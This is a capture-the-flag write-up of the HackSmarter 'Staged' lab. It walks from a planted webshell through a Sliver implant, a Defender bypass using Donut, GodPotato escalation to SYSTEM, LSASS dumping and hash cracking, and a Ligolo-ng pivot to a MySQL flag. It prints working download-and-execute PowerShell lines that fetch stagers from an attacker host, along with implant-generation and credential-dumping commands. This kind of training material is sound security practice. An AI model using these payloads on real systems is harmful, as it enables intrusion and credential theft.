---
title: "Staged"
platform: "HackSmarter"
category: "Windows"
difficulty: "Medium"
date: 2025-12-19
os: "Windows Server 2022 / Ubuntu 22.04"
tags: ["windows", "linux", "sliver", "c2", "av-bypass", "seimpersonate", "godpotato", "donut", "ligolo", "pivoting", "credential-dumping", "mysql", "uwu-toolkit"]
---

<div style="text-align: center;">
  <img src="/assets/images/ctf/staged/banner.png" alt="Staged Banner" style="max-width: 100%;" />
</div>

---

## Overview

| Property | Value |
|----------|-------|
| **Platform** | HackSmarter |
| **OS** | Windows Server 2022 / Ubuntu 22.04 |
| **Difficulty** | Medium |
| **Web Server IP** | `10.0.29.199` |
| **SQL Server IP** | `10.0.18.213` |

---

## Objective

As a member of the Hack Smarter Red Team, the mission is to perform a black-box penetration test against a client's critical infrastructure. A previous operator has already exploited a file upload vulnerability and established a webshell on the Windows web server. The engagement is complete upon successfully retrieving the final flag from the internal MySQL server.

> **Note:** This walkthrough demonstrates **[UwU Toolkit](https://github.com/p3ta00/uwu-toolkit)**, an integrated penetration testing framework currently in development.

---

## Scope

| Host | IP Address | Operating System | Role |
|------|------------|------------------|------|
| web.hacksmarter | 10.0.29.199 | Windows Server 2022 | Public-facing Web Server (Windows Defender enabled) |
| sqlsrv.hacksmarter | 10.0.18.213 | Ubuntu 22.04 | Internal MySQL Database Server |

---

## Attack Path Overview

```
┌─────────────────────────────────────────────────────────────────┐
│          Webshell Access (j.smith)                              │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│          Sliver C2 Implant (AV Bypass via Stager)               │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│          SeImpersonatePrivilege → GodPotato (Donut bypass)      │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│          NT AUTHORITY\SYSTEM → Administrator Password Set       │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│          RDP as Administrator → Sliver getsystem                │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│          Credential Dump (nanodump/pypykatz) → Hash Cracking    │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│          Ligolo-ng Pivot → Internal Network Access              │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│          MySQL Access (p.richardson) → FLAG CAPTURED            │
└─────────────────────────────────────────────────────────────────┘
```

---

## Enumeration

### Webshell Verification

A webshell was already deployed by a previous operator via a file upload vulnerability.

```bash
curl http://web.hacksmarter/hacksmarter/shell.php\?cmd\=whoami
```

```
ec2amaz-ibnmck4\j.smith
```

The webshell is operational, running as user `j.smith` on the Windows web server.

---

## Initial Access

### Sliver C2 Setup

Using UwU Toolkit, the Sliver C2 server is started for implant management.

```
UwU Toolkit > sliver start
UwU Toolkit > sliver connect

╔══════════════════════════════════════════════════════════════╗
║  Sliver C2 Interactive Mode                                  ║
║  Ctrl+D - Background and return to UwU                       ║
║  exit   - Exit Sliver and return to UwU                      ║
╚══════════════════════════════════════════════════════════════╝

? Select a server: uwu@127.0.0.1 (40f070f5d5a6d084)
Connecting to 127.0.0.1:31337 ...
[*] Loaded 22 aliases from disk
[*] Loaded 151 extension(s) from disk

[*] Server v1.5.44 - 9122878cbbcae543eb8210f616550382af2065fd
[*] Welcome to the sliver shell, please type 'help' for options

sliver >
```

### Implant Generation

An mTLS implant is generated with shellcode format for AV bypass staging:

```
sliver > generate --mtls 10.200.24.159:443 --format shellcode --os windows --arch amd64 --save implant.bin

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 21s
[*] Encoding shellcode with shikata ga nai ... success!
[*] Implant saved to /opt/uwu-toolkit/implant.bin
```

### Payload Staging

The implant is prepared for delivery using a custom stager to bypass Windows Defender:

```bash
# Copy implant to workspace
cp /opt/uwu-toolkit/implant.bin .

# Convert shellcode to base64 for staging
base64 -w0 implant.bin > implant.enc
```

**Stager Configuration (stager.ps1):**
```powershell
# ========================================
# CONFIGURATION - Modify these values
# ========================================
$runnerUrl = "http://10.200.24.159:8000/runner.exe"
$implantUrl = "http://10.200.24.159:8000/implant.enc"
```

### Starting the Web Server

```
UwU Toolkit > start gosh 8000
```

The UwU Dashboard monitors incoming connections and HTTP requests:

```
Working Dir: /workspace

HTTP Servers
─────────────────────────────────
● Python HTTP :8000 (PID 41411)

Listeners
─────────────────────────────────
● Netcat :38687 (listening)
● Sliver C2 :31337 (running)

Event Log
─────────────────────────────────
[11:02:29] HTTP started on port 8000
[11:03:58] :8000 <- 10.0.29.199 GET /stager.ps1
[11:03:58] :8000 <- 10.0.29.199 GET /runner.exe
[11:04:01] :8000 <- 10.0.29.199 GET /implant.enc
```

### Payload Execution

The payload is delivered through the webshell:

```
UwU Toolkit > shell curl -G 'http://web.hacksmarter/hacksmarter/shell.php' --data-urlencode 'cmd=powershell.exe IEX(IWR -UseBasicParsing http://10.200.24.159:8000/stager.ps1)'
```

### Session Confirmation

```
sliver > sessions

ID          Name              Transport  Remote Address       Hostname           Username  Operating System
==========  ================  =========  ==================   ================   ========  ================
993d71df    ECONOMIC_BELFRY   mtls       10.0.29.199:49951    EC2AMAZ-IBNMCK4   j.smith   windows/amd64
```

---

## Post-Exploitation

### Privilege Enumeration

Checking the current user's privileges reveals `SeImpersonatePrivilege`:

```
sliver (ECONOMIC_BELFRY) > sa-whoami

[*] Successfully executed sa-whoami (coff-loader)
[*] Got output:

UserName                         SID
=====================            ====================================
EC2AMAZ-IBNMCK4\j.smith         S-1-5-21-2241703281-3926990712-2237856116-1002

Privilege Name                   Description                               State
=============================    =========================================  =======
SeChangeNotifyPrivilege          Bypass traverse checking                   Enabled
SeImpersonatePrivilege           Impersonate a client after authentication  Enabled
SeCreateGlobalPrivilege          Create global objects                      Enabled
SeIncreaseWorkingSetPrivilege    Increase a process working set             Disabled
```

**SeImpersonatePrivilege is enabled!** This enables token impersonation attacks for SYSTEM escalation.

---

## Privilege Escalation

### Initial GodPotato Attempt (Blocked by AV)

Using UwU Toolkit's `seimpersonate` module:

```
UwU Toolkit > use post/seimpersonate
UwU Toolkit seimpersonate > run

[*] Running seimpersonate...
[*] Mode: Sliver
[*] Potato: GODPOTATO
[*] GodPotato - Works on Windows 8-11, Server 2012-2022
[*] Local binary: /opt/my-resources/tools/potatoes/GodPotato.exe
[+] Connected to Sliver server
[+] Using session: ECONOMIC_BELFRY (10.0.29.199:49951)

[*] Step 1: Uploading potato to target...
[+] Uploaded GodPotato.exe to C:\Windows\Temp\GodPotato.exe

[*] Step 2: Executing potato...
[*] Command: C:\Windows\Temp\GodPotato.exe -cmd "whoami"

[-] Sliver API error: <AioRpcError of RPC that terminated with:
    status = StatusCode.UNKNOWN
    details = "fork/exec C:\Windows\Temp\GodPotato.exe: Operation did not complete
    successfully because the file contains a virus or potentially unwanted software."
```

**Windows Defender blocked the execution.** An AV bypass is required.

### AV Bypass with Donut

GodPotato is converted to shellcode using Donut to bypass AV detection:

```bash
donut -i GodPotato.exe -a 2 -b 2 -p '-cmd "cmd /c net user administrator [REDACTED]"' -o ./gp.bin

[*] Processing: GodPotato.exe
[*] Architecture: x64
[+] Shellcode saved to: ./gp.bin
[+] Size: 76908 bytes
```

```bash
# Base64 encode for staging
base64 -w0 gp.bin > gp.enc
```

### Successful Privilege Escalation

The bypassed payload is executed via the stager:

```
UwU Toolkit > shell curl -G 'http://web.hacksmarter/hacksmarter/shell.php' --data-urlencode 'cmd=powershell.exe IEX(IWR -UseBasicParsing http://10.200.24.159:8000/stager_gp.ps1)'

[+] PowerShell Stager Starting...
[+] Downloading runner.exe from: http://10.200.24.159:8000/runner.exe
[*] Temp path: C:\Users\j.smith\AppData\Local\Temp\runner_4bbb51d3.exe
[+] Runner downloaded successfully
[*] File size: 8638464 bytes
[+] Executing: C:\Users\j.smith\AppData\Local\Temp\runner_4bbb51d3.exe -remote http://10.200.24.159:8000/gp.enc
[+] Shellcode decoded. Executing...
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] Start Search System Token
[*] PID : 856 Token:0x476 User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 664
The command completed successfully.
```

**Administrator password set via GodPotato running as SYSTEM!**

### Credential Verification

Port scanning reveals RDP is available:

```
UwU Toolkit nmap_scan > run

PORT      STATE  SERVICE          VERSION
80/tcp    open   http             Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.0.30)
443/tcp   open   ssl/http         Apache httpd 2.4.58
3389/tcp  open   ms-wbt-server    Microsoft Terminal Services
```

Credentials verified via NetExec:

```
UwU Toolkit netexec > set PROTOCOL rdp
UwU Toolkit netexec > run

[*] Executing: NetExec rdp 10.0.29.199 -u administrator -p [REDACTED]

[*] RDP  10.0.29.199  3389  EC2AMAZ-IBNMCK4  Windows 10 or Windows Server 2016 Build 20348
[+] RDP  10.0.29.199  3389  EC2AMAZ-IBNMCK4  [+] EC2AMAZ-IBNMCK4\administrator:[REDACTED] (admin)
```

### SYSTEM Access via RDP

An Administrator session is established via RDP and the Sliver implant is executed:

```powershell
PS C:\Users\Administrator> IEX(IWR -UseBasicParsing http://10.200.24.159:8000/stager.ps1)
```

```
sliver > use
? Select a session or beacon: SESSION d2a3674d ECONOMIC_BELFRY 10.0.29.199:50129
  EC2AMAZ-IBNMCK4 EC2AMAZ-IBNMCK4\Administrator windows/amd64

sliver (ECONOMIC_BELFRY) > getsystem
[*] A new SYSTEM session should pop soon...
[*] Session 13565a56 ECONOMIC_BELFRY - 10.0.29.199:50137 (EC2AMAZ-IBNMCK4) - windows/amd64
```

**NT AUTHORITY\SYSTEM achieved!**

---

## Credential Harvesting

### LSASS Memory Dump

```
sliver (ECONOMIC_BELFRY) > nanodump 648 lsass.dmp 1 PMDM

[*] Successfully executed nanodump (coff-loader)
[*] Got output:
Done, to download the dump run:
download lsass.dmp

sliver (ECONOMIC_BELFRY) > download lsass.dmp /workspace
[*] Wrote 9781226 bytes (1 file successfully) to /workspace/lsass.dmp
```

### Credential Extraction with Pypykatz

```bash
pypykatz lsa minidump lsass.dmp
```

**Extracted NTLM Hashes:**
```
58a478135a93ac3bf058a5ea0e8fdb71
c2c67b565cbf45f1c6b47c9d20ab138b
54cea054826ad7e3ed45bad5e0b7dc42
```

### Hash Cracking

```
UwU Toolkit > use auxiliary/hashcrack
UwU Toolkit hashcrack > set WORDLIST /home/p3ta/tools/rockyou.txt
UwU Toolkit hashcrack > run

[*] Running hashcrack...
[*] Loaded hashes from: /workspace/ntlm_hashes.txt
[*] No hash type specified, attempting to identify...
[+] Detected hash type: NTLM (or MD5 - mode 0) (mode: 1000)

[*] Running hashcat on omarchy...
[*] Command: hashcat -m 1000 /tmp/uwu_hashes_46968.txt /home/p3ta/tools/rockyou.txt

hashcat (v7.1.2) starting

CUDA API (CUDA 13.0)
====================
* Device #01: NVIDIA GeForce RTX 4070 Laptop GPU, 6827/7805 MB, 36MCU

=== CRACKED ===
58a478135a93ac3bf058a5ea0e8fdb71:[REDACTED]
c2c67b565cbf45f1c6b47c9d20ab138b:[REDACTED]

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Recovered........: 2/3 (66.67%) Digests
Speed.#01........: 24602.1 kH/s

[+] Module completed successfully
```

**Credentials obtained for p.richardson!**

```
UwU Toolkit > creds add p.richardson [REDACTED]
[+] Added credential: p.richardson
```

---

## Pivoting with Ligolo-ng

### Setting Up the Tunnel

To access the internal MySQL server, Ligolo-ng is deployed for pivoting:

```
ligolo-ng » ifcreate --name pivot
INFO[0343] Creating a new pivot interface...
INFO[0343] Interface created!

ligolo-ng » route_add --name pivot --route 240.0.0.1/32
INFO[0366] Route created.

ligolo-ng » route_add --name pivot --route 10.0.18.213/32
INFO[0400] Route created.
```

### Agent Deployment

The Ligolo agent is executed on the compromised Windows host:

```
UwU Toolkit ligolo_pivot > ligolo resume
[+] Resumed Ligolo-ng session
[*] Listening on 0.0.0.0:8443
[*] TUN interface: ligolo

INFO[0516] Agent joined. id=0affedbeebe3 name="EC2AMAZ-IBNMCK4\\j.smith@EC2AMAZ-IBNMCK4"
         remote="10.0.29.199:50162"
```

### Tunnel Activation

```
ligolo-ng » session
? Specify a session : 1 - EC2AMAZ-IBNMCK4\j.smith@EC2AMAZ-IBNMCK4 - 10.0.29.199:50162

[Agent : EC2AMAZ-IBNMCK4\j.smith@EC2AMAZ-IBNMCK4] » start
INFO[0599] Starting tunnel to EC2AMAZ-IBNMCK4\j.smith@EC2AMAZ-IBNMCK4 (0affedbeebe3)
```

---

## Internal Network Enumeration

### SQL Server Discovery

```
UwU Toolkit nmap_scan > set RHOSTS 10.1.237.149
UwU Toolkit nmap_scan > run

[*] Command: nmap -sC -sV -T4 -oA ./nmap_results/scan_10.1.237.149_standard 10.1.237.149

Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for sqlsrv.hacksmarter (10.1.237.149)
Host is up (0.015s latency).

PORT      STATE  SERVICE  VERSION
22/tcp    open   ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
3306/tcp  open   mysql    MySQL 5.5.5-10.6.22-MariaDB-0ubuntu0.22.04.1

| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.6.22-MariaDB-0ubuntu0.22.04.1
|   Thread ID: 36
|_  Auth Plugin Name: mysql_native_password

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**MySQL (port 3306) discovered on the internal server!**

---

## Database Compromise

### MySQL Authentication

Using the cracked `p.richardson` credentials:

```bash
mysql -h sqlsrv.hacksmarter -u p.richardson -p'[REDACTED]'

Welcome to the MariaDB monitor.
Your MariaDB connection id is 46
Server version: 10.6.22-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04
```

### Database Enumeration

```sql
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| hacksmarter_db     |
| information_schema |
+--------------------+

MariaDB [(none)]> use hacksmarter_db;
Database changed

MariaDB [hacksmarter_db]> show tables;
+--------------------------+
| Tables_in_hacksmarter_db |
+--------------------------+
| final_config             |
+--------------------------+
```

### Flag Retrieval

```sql
MariaDB [hacksmarter_db]> select * from final_config;
+----+-----------------+------------------------------------------+
| id | key_name        | key_value                                |
+----+-----------------+------------------------------------------+
|  1 | admin_api_token | FLAG{REDACTED}                           |
|  2 | system_status   | Operational                              |
+----+-----------------+------------------------------------------+
```

**Flag captured!**

---

## Credentials Summary

| User | Host | Password | Method |
|------|------|----------|--------|
| `j.smith` | web.hacksmarter | - | Webshell access (provided) |
| `administrator` | web.hacksmarter | `[REDACTED]` | Set via GodPotato SYSTEM execution |
| `p.richardson` | sqlsrv.hacksmarter | `[REDACTED]` | LSASS dump + hash cracking |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| **[UwU Toolkit](https://github.com/p3ta00/uwu-toolkit)** | Integrated penetration testing framework |
| **Sliver C2** | Command and control, implant management |
| **Donut** | PE to shellcode conversion (AV bypass) |
| **GodPotato** | SeImpersonate privilege escalation |
| **Nanodump** | LSASS memory dumping |
| **Pypykatz** | Credential extraction from minidumps |
| **Hashcat** | GPU-accelerated password hash cracking |
| **Ligolo-ng** | Network pivoting and tunneling |
| **NetExec (nxc)** | Protocol enumeration and validation |
| **Nmap** | Port scanning and service enumeration |

---

## Key Techniques

| Technique | MITRE ATT&CK |
|-----------|--------------|
| Command and Scripting Interpreter: PowerShell | T1059.001 |
| Obfuscated Files or Information | T1027 |
| Token Impersonation (Potato) | T1134.001 |
| OS Credential Dumping: LSASS Memory | T1003.001 |
| Password Cracking | T1110.002 |
| Network Pivoting | T1090 |
| Remote Services: SMB/Windows Admin Shares | T1021.002 |
| Data from Information Repositories: Databases | T1213.002 |

---

## References

- [Sliver C2 Documentation](https://github.com/BishopFox/sliver)
- [GodPotato - SeImpersonate Exploitation](https://github.com/BeichenDream/GodPotato)
- [Donut - Shellcode Generator](https://github.com/TheWover/donut)
- [Ligolo-ng Documentation](https://github.com/nicocha30/ligolo-ng)
- [Nanodump - LSASS Dumping](https://github.com/helpsystems/nanodump)
- [HackTricks - SeImpersonate Privilege](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)

